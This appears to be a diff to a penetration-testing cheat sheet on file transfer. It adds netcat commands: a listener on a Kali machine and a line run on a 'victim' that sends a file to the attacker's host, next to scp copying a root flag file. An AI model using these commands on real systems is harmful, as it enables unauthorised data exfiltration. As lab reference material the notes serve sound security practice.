@@ -26,6 +26,12 @@ cat <&3
 sudo systemctl enable ssh
 sudo systemctl start ssh
 scp plaintext@192.168.49.128:/root/myroot.txt .
+
+#Using netcat
+#to Kali:
+nc -lvnp 4444 > file
+#from Victim:
+netcat 10.10.10.10 4444 < file
 ```
 
 ### Linux Servers
